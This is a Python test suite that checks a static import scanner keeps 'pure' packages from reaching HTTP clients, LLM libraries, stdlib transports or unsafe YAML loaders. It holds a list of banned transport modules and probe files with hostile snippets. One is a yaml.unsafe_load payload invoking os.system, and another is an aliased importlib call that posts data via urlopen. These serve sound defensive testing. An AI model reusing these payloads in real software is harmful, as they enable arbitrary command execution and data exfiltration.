"""Invariant 1: the pure packages import no web framework, HTTP client or LLM library.

CLAUDE.md sells telemetry safety on this guard being *structural* — "the pure packages
cannot import an HTTP client, so telemetry can only live in `mendel-api`". For that claim
to hold, the guard has to cover the standard library, where the transports actually live,
and the dynamic import forms, which name their target at runtime.

An audit on 2026-08-03 defeated the first version with four lines:

    import urllib.request, socket, http.client
    importlib.import_module("httpx").post(...)
    __import__("openai").OpenAI()

All of it passed, because the banned list held only third-party names and the walk looked
only at import statements."""

import pytest
from support.paths import ROOT
from support.purity import (
    ATTRIBUTE_EXEMPT_PATH,
    BANLIST_PACKAGES,
    CLOSED_PACKAGES,
    IMPURE_PACKAGES,
    _declared,
    _half_of,
    _imported_roots,
    _outside_allowlist,
    _violations,
)


def test_pure_packages_import_nothing_impure():
    root = ROOT
    violations: list[str] = []
    for pkg, allowed in CLOSED_PACKAGES.items():
        for py in sorted((root / "packages" / pkg / "src").rglob("*.py")):
            violations += _violations(py, root)
            violations += _outside_allowlist(py, root, allowed)
    for pkg in BANLIST_PACKAGES:
        for py in sorted((root / "packages" / pkg / "src").rglob("*.py")):
            violations += _violations(py, root)
    assert violations == [], "Pure packages must not import I/O or model libraries:\n" + "\n".join(
        violations
    )


def test_a_pure_package_cannot_name_an_unsafe_yaml_loader(tmp_path):
    """A58. `yaml` is on the allowlist and `yaml.unsafe_load` is arbitrary code execution:
    `!!python/object/apply:` instantiates any importable callable.

    It is a single-link attribute on an *allowlisted* module, so no rule above sees it — the
    `ast.Attribute` rule fires only when the attribute is itself a module name, and
    `unsafe_load` is not one. That is a whole axis the scan did not model, not the documented
    two-link/`getattr` gap: an allowlist over module names says nothing about what a listed
    module can do.
    """
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe,
            "import yaml\n"
            "def go():\n"
            "    return yaml.unsafe_load("
            "'!!python/object/apply:os.system\\nargs: [id]\\n')\n",
        )
    )
    assert _violations(probe, tmp_path), "yaml.unsafe_load reached os.system with the scan green"


def test_an_aliased_yaml_loader_is_caught_too(tmp_path):
    """A60 is that the dynamic-importer check matches a *spelling*. This rule must not have
    the same shape, so it resolves the local name to the module it was bound from."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(probe, "import yaml as y\ndef go():\n    return y.unsafe_load('!!python/none')\n")
    )
    assert _violations(probe, tmp_path), "an aliased loader walked past the check"


def test_the_strict_loader_is_the_one_exemption():
    """`yaml_strict.py` names `yaml.load` and a `Loader=` on purpose — it is the single place
    a loader may be spelled, and every other file in the pure packages reads through it.
    That is what makes the ban cost nothing."""
    root = ROOT
    assert _violations(root / ATTRIBUTE_EXEMPT_PATH, root) == []


def test_a_loader_imported_as_a_bare_name_is_caught(tmp_path):
    """A58, third route. `from yaml import unsafe_load` binds the loader as a bare name and
    calls it with no attribute access anywhere — so the attribute rule has nothing to see.
    Three spellings, one capability; the check has to be on the capability."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(probe, "from yaml import unsafe_load\ndef go():\n    return unsafe_load('x')\n")
    )
    assert _violations(probe, tmp_path), "a bare-name loader import walked past the check"


# --- Round four's carried purity findings: A60, A61, A63, A67 -----------------------------
def test_an_aliased_dynamic_importer_is_caught(tmp_path):
    """A60, issue #24. `DYNAMIC_IMPORTERS` was compared against `node.func.id`/`.attr`, so
    the importer could be bound under any name — which is A18's defect exactly, in the one
    rule that had not learned it. `test_purity.py` already held the alias resolver that fixes
    it, and `test_construction.py` imports that resolver *from this file*.

    Reviewer's probe reached `urlopen` from `mendel-compiler` with the guard green.
    """
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe,
            "from importlib import import_module as _load\n"
            "def go(p):\n"
            "    _load('urllib.request').urlopen('http://127.0.0.1:9/c', data=p.encode())\n",
        )
    )
    assert _violations(probe, tmp_path), "an aliased importer obtained urllib with the scan green"


def test_importlib_itself_is_banned(tmp_path):
    """The other half of A60. Resolving the alias catches the call; banning the module stops
    it being bound at all, and the two together mean neither has to be complete."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe, "import importlib\ndef go():\n    return importlib.import_module('socket')\n"
        )
    )
    assert _violations(probe, tmp_path)


def test_importlib_metadata_is_still_reachable(tmp_path):
    """The negative that keeps the ban honest. `importlib.metadata` reads installed package
    versions and opens nothing; refusing it would be a check nobody could disable for a
    module that cannot transport anything."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe,
            "import importlib.metadata\ndef v():\n    return importlib.metadata.version('x')\n",
        )
    )
    assert _violations(probe, tmp_path) == []


@pytest.mark.parametrize(
    "module, why",
    [
        ("logging.handlers", "HTTPHandler is a complete HTTP POST client"),
        ("poplib", "a mail transport"),
        ("imaplib", "a mail transport"),
        ("socketserver", "exact membership, so `socket` does not cover it"),
        ("multiprocessing", "multiprocessing.connection.Client opens a socket"),
        ("wsgiref", "a server"),
    ],
)
def test_a_stdlib_transport_is_banned(tmp_path, module, why):
    """A61, issue #25. The banlist claimed to cover "stdlib transports" and enumerated some
    of them — and an enumeration can only forbid what somebody named, which is the same
    lesson the egress guard learned when it became an allowlist."""
    probe = tmp_path / "beacon.py"
    probe.write_text(_declared(probe, f"import {module}\ndef go():\n    return {module}\n"))
    assert _violations(probe, tmp_path), f"{module} — {why}"


def test_every_package_is_classified():
    """A67, issue #31. `test_purity.py` and `test_construction.py` glob
    `packages/<name>/src`; a missing directory yields nothing and the assertion runs over an
    empty list. The reviewer mistyped both package keys and got `1 passed` in 0.04s.

    **A package intended pure but renamed silently carries no guard**, and the failure is
    silent in the direction nobody investigates: the gate goes green faster.
    `test_purity_runtime.py` has this guard-of-the-guard and the other two did not.
    """
    root = ROOT
    on_disk = {p.name for p in (root / "packages").iterdir() if p.is_dir()}
    classified = set(CLOSED_PACKAGES) | set(BANLIST_PACKAGES) | set(IMPURE_PACKAGES)
    assert on_disk == classified, (
        "every package must be classified pure, banlist or explicitly impure — a package "
        "this file has never heard of is a package it is not guarding:\n"
        f"  on disk, unclassified: {sorted(on_disk - classified)}\n"
        f"  classified, not on disk: {sorted(classified - on_disk)}"
    )


def test_each_guarded_package_has_source_to_scan():
    """The other half. A directory that exists and holds no Python is the same silence."""
    root = ROOT
    for pkg in [*CLOSED_PACKAGES, *BANLIST_PACKAGES]:
        src = root / "packages" / pkg / "src"
        assert src.is_dir(), f"{pkg} is guarded and has no src/ — the scan would find nothing"
        assert list(src.rglob("*.py")), f"{pkg}/src holds no Python; the scan is running on air"


def test_the_attribute_exemption_names_a_file_that_exists():
    """`ATTRIBUTE_EXEMPT_PATH` is the one file allowed to name a YAML loader.

    A path that matches nothing exempts nothing — which would make `yaml_strict.py` itself
    fail the rule it exists to satisfy, loudly. That is the safe direction, and this test is
    here for the same reason the other two are: the direction is an accident of which way the
    check happens to be written, not something to rely on. A67, issue #41.
    """
    root = ROOT
    assert (root / ATTRIBUTE_EXEMPT_PATH).exists(), (
        f"{ATTRIBUTE_EXEMPT_PATH} does not exist, so the exemption covers nothing"
    )


def test_the_two_halves_share_only_comeni_core():
    """`docs/design/wiener.md` §3.3, and **it was not built until 2026-08-24**.

    Nothing under `mendel_*` may import `wiener_*`, and nothing under `wiener_*` may import
    `mendel_*` — with the single exception of `comeni_core`, which is the shared artifact
    vocabulary and the reason that package keeps the platform name.

    **The exception is the interesting half.** `wiener-core` reads `Pipeline` because a run is
    a run *of an artifact*; everything else about Mendel — resolution, the registry, the forge —
    is invisible to Wiener, and a laboratory can run Wiener against a pipeline Mendel never
    built. That independence is a feature (§12.1), and it stops being true the first time an
    import crosses.

    **What made this urgent rather than tidy**: phase 3 draws the run graph, `layout.py` lives
    in `mendel-compiler`, and the obvious way to get it is an import. `wiener-core` happens to
    be protected — its allowlist is closed, so any `mendel_*` import fails there already — but
    `wiener-api` is impure and unguarded, and so is every `mendel-*` package in the other
    direction. Both were reverted and watched before this existed: green, twice.
    """
    root = ROOT
    packages = sorted(p.name for p in (root / "packages").iterdir() if p.is_dir())
    halves = {name: _half_of(name) for name in packages}
    assert {"mendel", "wiener"} <= set(halves.values()), (
        f"this scan found no two halves to keep apart: {halves}"
    )

    offences: list[str] = []
    for package, half in halves.items():
        if half is None:
            continue
        forbidden = "wiener_" if half == "mendel" else "mendel_"
        for path in sorted((root / "packages" / package / "src").rglob("*.py")):
            crossed = sorted(r for r in _imported_roots(path) if r.startswith(forbidden))
            if crossed:
                offences.append(f"{path.relative_to(root)} imports {', '.join(crossed)}")

    assert offences == [], (
        "the two halves of the product may share only `comeni_core`:\n  "
        + "\n  ".join(offences)
        + "\nA run is a run OF an artifact, so `wiener-core` reads `Pipeline` — and nothing "
        "else about Mendel is Wiener's to see. docs/design/wiener.md §3.3."
    )


def test_no_pure_package_imports_an_impure_one():
    """The dependency arrow, asserted rather than assumed.

    `mendel-forge` importing `mendel-resolver` is the design. The reverse would put an
    impure package inside the purity boundary by transitivity, and the AST scan would
    not see it — it scans the pure packages' own imports, and `mendel_forge` is not on
    any banlist because it is not supposed to be reachable at all.
    """
    root = ROOT
    offenders = []
    for pkg in [*CLOSED_PACKAGES, *BANLIST_PACKAGES]:
        for path in sorted((root / "packages" / pkg / "src").rglob("*.py")):
            if "mendel_forge" in path.read_text():
                offenders.append(str(path.relative_to(root)))
    assert offenders == [], (
        "a pure package references mendel_forge; the dependency arrow points the other "
        f"way: {offenders}"
    )
